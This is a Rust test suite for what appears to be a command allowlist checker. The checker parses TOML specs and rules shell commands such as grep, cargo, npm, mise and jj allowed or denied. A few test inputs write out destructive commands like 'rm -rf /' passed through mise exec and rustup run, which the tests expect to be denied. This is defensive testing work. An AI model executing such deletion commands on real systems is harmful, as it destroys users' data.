use super::*;
    use super::types::DispatchKind;
    use crate::parse::Token;
    use crate::verdict::{SafetyLevel, Verdict};

    fn toks(words: &[&str]) -> Vec<Token> {
        words.iter().map(|s| Token::from_test(s)).collect()
    }

    fn load_one(toml_str: &str) -> CommandSpec {
        let mut specs = load_toml(toml_str, "test");
        assert_eq!(specs.len(), 1);
        specs.remove(0)
    }

    // ---------------------------------------------------------------
    // Flat commands
    // ---------------------------------------------------------------

    #[test]
    fn flat_bare_allowed() {
        let spec = load_one(r#"
            [[command]]
            name = "wc"
            bare = true
        "#);
        assert_eq!(dispatch_spec(&toks(&["wc"]), &spec), Verdict::Allowed(SafetyLevel::Inert));
    }

    #[test]
    fn flat_bare_denied_when_false() {
        let spec = load_one(r#"
            [[command]]
            name = "grep"
            bare = false
        "#);
        assert_eq!(dispatch_spec(&toks(&["grep"]), &spec), Verdict::Denied);
    }

    #[test]
    fn flat_standalone_flag() {
        let spec = load_one(r#"
            [[command]]
            name = "wc"
            bare = true
            standalone = ["-l", "--lines"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["wc", "-l", "file.txt"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn flat_unknown_flag_rejected() {
        let spec = load_one(r#"
            [[command]]
            name = "wc"
            standalone = ["-l"]
        "#);
        assert_eq!(dispatch_spec(&toks(&["wc", "--evil"]), &spec), Verdict::Denied);
    }

    #[test]
    fn flat_valued_flag_space() {
        let spec = load_one(r#"
            [[command]]
            name = "grep"
            bare = false
            valued = ["--max-count", "-m"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["grep", "--max-count", "5", "pattern"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn flat_valued_flag_eq() {
        let spec = load_one(r#"
            [[command]]
            name = "grep"
            bare = false
            valued = ["--max-count"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["grep", "--max-count=5", "pattern"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn flat_combined_short_flags() {
        let spec = load_one(r#"
            [[command]]
            name = "grep"
            bare = false
            standalone = ["-r", "-n", "-i"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["grep", "-rni", "pattern", "."]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn flat_combined_short_unknown_rejected() {
        let spec = load_one(r#"
            [[command]]
            name = "grep"
            bare = false
            standalone = ["-r", "-n"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["grep", "-rnz", "pattern"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn flat_combined_short_with_valued_last() {
        let spec = load_one(r#"
            [[command]]
            name = "grep"
            bare = false
            standalone = ["-r", "-n"]
            valued = ["-m"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["grep", "-rnm", "5", "pattern"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn flat_double_dash_stops_flag_checking() {
        let spec = load_one(r#"
            [[command]]
            name = "grep"
            bare = false
            standalone = ["-r"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["grep", "-r", "--", "--not-a-flag", "file"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn flat_max_positional_enforced() {
        let spec = load_one(r#"
            [[command]]
            name = "uniq"
            bare = true
            max_positional = 1
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["uniq", "a"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["uniq", "a", "b"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn flat_max_positional_after_double_dash() {
        let spec = load_one(r#"
            [[command]]
            name = "uniq"
            bare = true
            max_positional = 1
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["uniq", "--", "a", "b"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn flat_tolerate_unknown_long() {
        let spec = load_one(r#"
            [[command]]
            name = "echo"
            bare = true
            tolerate_unknown_long = true
            standalone = ["-n", "-e"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["echo", "--unknown", "hello"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn legacy_positional_style_panics() {
        let result = std::panic::catch_unwind(|| {
            load_one(r#"
                [[command]]
                name = "demo-legacy"
                bare = true
                positional_style = true
            "#);
        });
        assert!(result.is_err(),
            "loading positional_style = true should panic with migration guidance");
    }

    #[test]
    fn flat_level_safe_read() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"
            level = "SafeRead"
            bare = true
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo"]), &spec),
            Verdict::Allowed(SafetyLevel::SafeRead),
        );
    }

    #[test]
    fn flat_level_safe_write() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"
            level = "SafeWrite"
            bare = true
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo"]), &spec),
            Verdict::Allowed(SafetyLevel::SafeWrite),
        );
    }

    // ---------------------------------------------------------------
    // Structured commands with subcommands
    // ---------------------------------------------------------------

    #[test]
    fn structured_bare_rejected() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"
            bare_flags = ["--help"]

            [[command.sub]]
            name = "build"
            level = "SafeWrite"
        "#);
        assert_eq!(dispatch_spec(&toks(&["cargo"]), &spec), Verdict::Denied);
    }

    #[test]
    fn structured_bare_flag() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"
            bare_flags = ["--help", "-h"]

            [[command.sub]]
            name = "build"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "--help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn structured_bare_flag_with_extra_rejected() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"
            bare_flags = ["--help"]

            [[command.sub]]
            name = "build"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "--help", "extra"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn structured_help_denied_when_not_in_bare_flags() {
        let spec = load_one(r#"
            [[command]]
            name = "tea"
            bare_flags = ["--version", "-v"]

            [[command.sub]]
            name = "whoami"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["tea", "--help"]), &spec),
            Verdict::Denied,
        );
        assert_eq!(
            dispatch_spec(&toks(&["tea", "-h"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn structured_help_allowed_when_in_bare_flags() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"
            bare_flags = ["--help", "-h"]

            [[command.sub]]
            name = "build"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "--help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "-h"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn nested_help_allowed_without_bare_flags() {
        let spec = load_one(r#"
            [[command]]
            name = "tool"

            [[command.sub]]
            name = "config"

            [[command.sub.sub]]
            name = "get"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["tool", "config", "--help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["tool", "config", "-h"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn nested_help_with_trailing_denied() {
        let spec = load_one(r#"
            [[command]]
            name = "tool"

            [[command.sub]]
            name = "config"

            [[command.sub.sub]]
            name = "get"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["tool", "config", "--help", "extra"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn structured_unknown_sub_rejected() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"

            [[command.sub]]
            name = "build"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "deploy"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn structured_sub_policy() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"

            [[command.sub]]
            name = "test"
            level = "SafeRead"
            standalone = ["--release", "-h"]
            valued = ["--jobs", "-j"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "test", "--release", "-j", "4"]), &spec),
            Verdict::Allowed(SafetyLevel::SafeRead),
        );
    }

    #[test]
    fn structured_sub_unknown_flag_rejected() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"

            [[command.sub]]
            name = "test"
            standalone = ["--release"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "test", "--evil"]), &spec),
            Verdict::Denied,
        );
    }

    // ---------------------------------------------------------------
    // Guarded subcommands
    // ---------------------------------------------------------------

    #[test]
    fn guarded_with_guard() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"

            [[command.sub]]
            name = "fmt"
            guard = "--check"
            standalone = ["--all", "--check", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "fmt", "--check"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn guarded_without_guard_rejected() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"

            [[command.sub]]
            name = "fmt"
            guard = "--check"
            standalone = ["--all", "--check"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "fmt"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn guarded_with_short_form() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"

            [[command.sub]]
            name = "package"
            guard = "--list"
            guard_short = "-l"
            standalone = ["--list", "-l"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "package", "-l"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn guarded_with_eq_syntax() {
        let spec = load_one(r#"
            [[command]]
            name = "tool"

            [[command.sub]]
            name = "sub"
            guard = "--mode"
            valued = ["--mode"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["tool", "sub", "--mode=check"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn guarded_short_eq_does_not_satisfy_guard() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"

            [[command.sub]]
            name = "package"
            guard = "--list"
            guard_short = "-l"
            standalone = ["--list", "-l"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "package", "-l=foo"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn guarded_long_eq_satisfies_guard() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"

            [[command.sub]]
            name = "package"
            guard = "--list"
            guard_short = "-l"
            valued = ["--list"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "package", "--list=all"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn guarded_help_positional_allowed() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"

            [[command.sub]]
            name = "fmt"
            guard = "--check"
            standalone = ["--all", "--check"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "fmt", "--help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "fmt", "-h"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "fmt", "help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    // ---------------------------------------------------------------
    // Nested subcommands
    // ---------------------------------------------------------------

    #[test]
    fn nested_sub() {
        let spec = load_one(r#"
            [[command]]
            name = "mise"

            [[command.sub]]
            name = "config"

            [[command.sub.sub]]
            name = "get"
            standalone = ["--help", "-h"]

            [[command.sub.sub]]
            name = "list"
            standalone = ["--help", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["mise", "config", "get"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["mise", "config", "delete"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn nested_bare_rejected() {
        let spec = load_one(r#"
            [[command]]
            name = "mise"

            [[command.sub]]
            name = "config"

            [[command.sub.sub]]
            name = "get"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["mise", "config"]), &spec),
            Verdict::Denied,
        );
    }

    // ---------------------------------------------------------------
    // Nested with nested_bare = true
    // ---------------------------------------------------------------

    #[test]
    fn nested_bare_allowed_when_flag_set() {
        let spec = load_one(r#"
            [[command]]
            name = "mise"

            [[command.sub]]
            name = "settings"
            nested_bare = true

            [[command.sub.sub]]
            name = "get"
            standalone = ["--help", "-h", "-q", "-v"]

            [[command.sub.sub]]
            name = "list"
            standalone = ["--help", "-h", "-q", "-v"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["mise", "settings"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn nested_bare_help_allowed() {
        let spec = load_one(r#"
            [[command]]
            name = "mise"

            [[command.sub]]
            name = "settings"
            nested_bare = true

            [[command.sub.sub]]
            name = "get"
            standalone = ["--help", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["mise", "settings", "--help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["mise", "settings", "-h"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn nested_bare_still_dispatches_to_subs() {
        let spec = load_one(r#"
            [[command]]
            name = "mise"

            [[command.sub]]
            name = "settings"
            nested_bare = true

            [[command.sub.sub]]
            name = "get"
            standalone = ["--help", "-h", "-q", "-v"]

            [[command.sub.sub]]
            name = "list"
            standalone = ["--help", "-h", "-q", "-v"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["mise", "settings", "get"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["mise", "settings", "list"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["mise", "settings", "get", "-q"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn nested_bare_rejects_unknown_sub() {
        let spec = load_one(r#"
            [[command]]
            name = "mise"

            [[command.sub]]
            name = "settings"
            nested_bare = true

            [[command.sub.sub]]
            name = "get"
            standalone = ["--help", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["mise", "settings", "set"]), &spec),
            Verdict::Denied,
        );
        assert_eq!(
            dispatch_spec(&toks(&["mise", "settings", "delete"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn nested_bare_rejects_unknown_flags() {
        let spec = load_one(r#"
            [[command]]
            name = "mise"

            [[command.sub]]
            name = "settings"
            nested_bare = true

            [[command.sub.sub]]
            name = "get"
            standalone = ["--help", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["mise", "settings", "--evil"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn nested_bare_false_is_default() {
        let spec = load_one(r#"
            [[command]]
            name = "npm"

            [[command.sub]]
            name = "config"

            [[command.sub.sub]]
            name = "get"
            standalone = ["--help", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["npm", "config"]), &spec),
            Verdict::Denied,
        );
    }

    // ---------------------------------------------------------------
    // AllowAll
    // ---------------------------------------------------------------

    #[test]
    fn allow_all_accepts_anything() {
        let spec = load_one(r#"
            [[command]]
            name = "git"

            [[command.sub]]
            name = "help"
            allow_all = true
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["git", "help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["git", "help", "commit", "--verbose"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    // ---------------------------------------------------------------
    // FirstArgFilter (first_arg field)
    // ---------------------------------------------------------------

    #[test]
    fn first_arg_exact_match() {
        let spec = load_one(r#"
            [[command]]
            name = "npm"
            bare_flags = ["--help", "--version", "-V", "-h"]

            [[command.sub]]
            name = "run"
            first_arg = ["test"]
            level = "SafeRead"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["npm", "run", "test"]), &spec),
            Verdict::Allowed(SafetyLevel::SafeRead),
        );
    }

    #[test]
    fn first_arg_glob_match() {
        let spec = load_one(r#"
            [[command]]
            name = "npm"

            [[command.sub]]
            name = "run"
            first_arg = ["test", "test:*"]
            level = "SafeRead"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["npm", "run", "test:unit"]), &spec),
            Verdict::Allowed(SafetyLevel::SafeRead),
        );
        assert_eq!(
            dispatch_spec(&toks(&["npm", "run", "test:integration"]), &spec),
            Verdict::Allowed(SafetyLevel::SafeRead),
        );
    }

    #[test]
    fn first_arg_rejects_non_matching() {
        let spec = load_one(r#"
            [[command]]
            name = "npm"

            [[command.sub]]
            name = "run"
            first_arg = ["test", "test:*"]
            level = "SafeRead"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["npm", "run", "build"]), &spec),
            Verdict::Denied,
        );
        assert_eq!(
            dispatch_spec(&toks(&["npm", "run", "start"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn first_arg_rejects_bare() {
        let spec = load_one(r#"
            [[command]]
            name = "npm"

            [[command.sub]]
            name = "run"
            first_arg = ["test"]
            level = "SafeRead"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["npm", "run"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn first_arg_allows_help() {
        let spec = load_one(r#"
            [[command]]
            name = "npm"

            [[command.sub]]
            name = "run"
            first_arg = ["test"]
            level = "SafeRead"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["npm", "run", "--help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["npm", "run", "-h"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn first_arg_glob_does_not_match_partial() {
        let spec = load_one(r#"
            [[command]]
            name = "npm"

            [[command.sub]]
            name = "run"
            first_arg = ["test:*"]
            level = "SafeRead"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["npm", "run", "test"]), &spec),
            Verdict::Denied,
        );
        assert_eq!(
            dispatch_spec(&toks(&["npm", "run", "testing"]), &spec),
            Verdict::Denied,
        );
    }

    // ---------------------------------------------------------------
    // RequireAny
    // ---------------------------------------------------------------

    #[test]
    fn require_any_with_required_flag() {
        let spec = load_one(r#"
            [[command]]
            name = "conda"
            bare_flags = ["--help", "--version", "-V", "-h"]

            [[command.sub]]
            name = "config"
            bare = false
            require_any = ["--show", "--show-sources"]
            standalone = ["--help", "--json", "--quiet", "--show", "--show-sources", "--verbose", "-h", "-q", "-v"]
            valued = ["--env", "--file", "--name", "--prefix", "-f", "-n", "-p"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["conda", "config", "--show"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["conda", "config", "--show-sources"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["conda", "config", "--show", "--json"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn require_any_without_required_flag() {
        let spec = load_one(r#"
            [[command]]
            name = "conda"

            [[command.sub]]
            name = "config"
            bare = false
            require_any = ["--show", "--show-sources"]
            standalone = ["--help", "--json", "--show", "--show-sources", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["conda", "config", "--json"]), &spec),
            Verdict::Denied,
        );
        assert_eq!(
            dispatch_spec(&toks(&["conda", "config"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn require_any_allows_help() {
        let spec = load_one(r#"
            [[command]]
            name = "conda"

            [[command.sub]]
            name = "config"
            bare = false
            require_any = ["--show"]
            standalone = ["--help", "--show", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["conda", "config", "--help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["conda", "config", "-h"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn require_any_rejects_unknown_flags() {
        let spec = load_one(r#"
            [[command]]
            name = "conda"

            [[command.sub]]
            name = "config"
            bare = false
            require_any = ["--show"]
            standalone = ["--help", "--show", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["conda", "config", "--show", "--evil"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn require_any_with_eq_syntax() {
        let spec = load_one(r#"
            [[command]]
            name = "tool"

            [[command.sub]]
            name = "sub"
            bare = false
            require_any = ["--mode"]
            standalone = ["--help"]
            valued = ["--mode"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["tool", "sub", "--mode=check"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn require_any_rejects_unlisted_extra_flags() {
        let spec = load_one(r#"
            [[command]]
            name = "conda"

            [[command.sub]]
            name = "config"
            bare = false
            require_any = ["--show", "--show-sources"]
            standalone = ["--help", "--show", "--show-sources", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["conda", "config", "--show", "--set"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn require_any_short_eq_does_not_satisfy() {
        let spec = load_one(r#"
            [[command]]
            name = "tool"

            [[command.sub]]
            name = "sub"
            bare = false
            require_any = ["--show", "-s"]
            standalone = ["--help", "--show", "-h", "-s"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["tool", "sub", "-s=foo"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn require_any_short_in_combined_satisfies() {
        let spec = load_one(r#"
            [[command]]
            name = "tool"
            bare = false
            require_any = ["-z"]
            standalone = ["-z", "-v", "-n", "-h", "--help"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["tool", "-zv", "host", "80"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["tool", "-nvz", "host", "80"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["tool", "-nv", "host", "80"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn require_any_long_eq_satisfies() {
        let spec = load_one(r#"
            [[command]]
            name = "tool"

            [[command.sub]]
            name = "sub"
            bare = false
            require_any = ["--show", "-s"]
            valued = ["--show"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["tool", "sub", "--show=all"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn require_any_does_not_accept_bare_help() {
        let spec = load_one(r#"
            [[command]]
            name = "tool"

            [[command.sub]]
            name = "sub"
            bare = false
            require_any = ["--show"]
            standalone = ["--help", "--show", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["tool", "sub", "--help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["tool", "sub", "-h"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["tool", "sub", "help"]), &spec),
            Verdict::Denied,
        );
    }

    // ---------------------------------------------------------------
    // WriteFlagged
    // ---------------------------------------------------------------

    #[test]
    fn write_flagged_base_level() {
        let spec = load_one(r#"
            [[command]]
            name = "sk"

            [[command.sub]]
            name = "run"
            write_flags = ["--history"]
            standalone = ["--help", "-h"]
            valued = ["--history", "--query", "-q"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["sk", "run", "-q", "test"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn write_flagged_with_write_flag() {
        let spec = load_one(r#"
            [[command]]
            name = "sk"

            [[command.sub]]
            name = "run"
            write_flags = ["--history"]
            standalone = ["--help"]
            valued = ["--history", "--query"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["sk", "run", "--history", "/tmp/h"]), &spec),
            Verdict::Allowed(SafetyLevel::SafeWrite),
        );
    }

    #[test]
    fn write_flagged_with_eq_syntax() {
        let spec = load_one(r#"
            [[command]]
            name = "sk"

            [[command.sub]]
            name = "run"
            write_flags = ["--history"]
            valued = ["--history"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["sk", "run", "--history=/tmp/h"]), &spec),
            Verdict::Allowed(SafetyLevel::SafeWrite),
        );
    }

    // ---------------------------------------------------------------
    // DelegateAfterSeparator
    // ---------------------------------------------------------------

    #[test]
    fn delegate_after_separator_safe() {
        let spec = load_one(r#"
            [[command]]
            name = "mise"

            [[command.sub]]
            name = "exec"
            delegate_after = "--"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["mise", "exec", "--", "echo", "hello"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn delegate_after_separator_unsafe() {
        let spec = load_one(r#"
            [[command]]
            name = "mise"

            [[command.sub]]
            name = "exec"
            delegate_after = "--"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["mise", "exec", "--", "rm", "-rf", "/"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn delegate_after_separator_no_separator() {
        let spec = load_one(r#"
            [[command]]
            name = "mise"

            [[command.sub]]
            name = "exec"
            delegate_after = "--"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["mise", "exec", "echo"]), &spec),
            Verdict::Denied,
        );
    }

    // ---------------------------------------------------------------
    // DelegateSkip
    // ---------------------------------------------------------------

    #[test]
    fn delegate_skip_safe() {
        let spec = load_one(r#"
            [[command]]
            name = "rustup"

            [[command.sub]]
            name = "run"
            delegate_skip = 2
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["rustup", "run", "stable", "echo", "hello"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn delegate_skip_unsafe() {
        let spec = load_one(r#"
            [[command]]
            name = "rustup"

            [[command.sub]]
            name = "run"
            delegate_skip = 2
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["rustup", "run", "stable", "rm", "-rf"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn delegate_skip_no_inner() {
        let spec = load_one(r#"
            [[command]]
            name = "rustup"

            [[command.sub]]
            name = "run"
            delegate_skip = 2
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["rustup", "run", "stable"]), &spec),
            Verdict::Denied,
        );
    }

    // ---------------------------------------------------------------
    // Aliases
    // ---------------------------------------------------------------

    #[test]
    fn alias_dispatch() {
        let specs = load_toml(r#"
            [[command]]
            name = "grep"
            aliases = ["egrep"]
            bare = false
            standalone = ["-r"]
        "#, "test");
        let registry = build_registry(specs);
        let spec = registry.get("egrep").expect("alias registered");
        assert_eq!(
            dispatch_spec(&toks(&["egrep", "-r", "pattern"]), spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    // ---------------------------------------------------------------
    // Custom handler reference
    // ---------------------------------------------------------------

    #[test]
    fn custom_handler_returns_denied_by_default() {
        let spec = load_one(r#"
            [[command]]
            name = "curl"
            handler = "curl"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["curl", "http://example.com"]), &spec),
            Verdict::Denied,
        );
    }

    // ---------------------------------------------------------------
    // ---------------------------------------------------------------
    // Structured with wrapper (global flag stripping)
    // ---------------------------------------------------------------

    #[test]
    fn structured_wrapper_strips_flags() {
        let spec = load_one(r#"
            [[command]]
            name = "jj"
            bare_flags = ["--help", "--version", "-h"]
            [command.wrapper]
            standalone = ["--no-pager", "--quiet"]
            valued = ["--color", "-R"]

            [[command.sub]]
            name = "log"
            standalone = ["--help", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["jj", "--no-pager", "log"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["jj", "--color", "auto", "log"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["jj", "-R", "/repo", "--quiet", "log"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn structured_wrapper_still_dispatches_subs() {
        let spec = load_one(r#"
            [[command]]
            name = "jj"
            bare_flags = ["--help", "-h"]
            [command.wrapper]
            standalone = ["--no-pager"]

            [[command.sub]]
            name = "log"

            [[command.sub]]
            name = "diff"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["jj", "log"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["jj", "diff"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["jj", "push"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn structured_wrapper_bare_flags_still_work() {
        let spec = load_one(r#"
            [[command]]
            name = "jj"
            bare_flags = ["--help", "--version", "-h"]
            [command.wrapper]
            standalone = ["--no-pager"]

            [[command.sub]]
            name = "log"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["jj", "--help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["jj", "--version"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn structured_wrapper_rejects_unknown_sub() {
        let spec = load_one(r#"
            [[command]]
            name = "jj"
            [command.wrapper]
            standalone = ["--no-pager"]

            [[command.sub]]
            name = "log"
        "#);
        assert_eq!(
